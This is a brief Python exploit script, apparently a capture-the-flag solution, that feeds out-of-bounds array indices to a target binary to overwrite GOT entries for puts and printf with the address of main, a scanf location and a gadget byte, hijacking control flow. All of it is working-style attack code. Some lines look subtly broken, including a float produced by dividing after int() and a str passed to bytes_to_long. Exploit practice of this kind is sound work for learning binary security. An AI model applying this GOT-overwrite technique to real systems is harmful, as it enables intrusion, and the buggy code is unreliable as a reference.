#!/usr/bin/env python3

from Crypto.Util.number import bytes_to_long
from pwn import *

n = 1 # array size n

puts_plt = 0x601018
arr = 0x6022a0
main = 0x400737
print(n)
print(int((puts_plt - arr) / 4))
print(main)

arr += 0x20
buf_scanf = 0x4008e9
string = bytes_to_long('%c')
print(n)
print(int(buf_scanf - arr) / 4)
print(string)

printf_plt = 0x601028
offset = 0x81
gadget = offset * 16**8
hex_gadget = hex(gadget)

lst = [hex_gadget[i:i+2] for i in range(2, len(hex_gadget) - 1, 2)]
lst = [int(''.join(lst[-4:]), 16)]

i = int((printf_plt - arr) / 4) # only overwite last byte
print(n)
print(i)
print(lst[0])

"""
scanf n = 0x400779
scanf i = 0x4007cc
scanf d = 0x40080a
calloc = 0x40079f
after calloc = 0x4007a4
exit = 0x40078d
"""
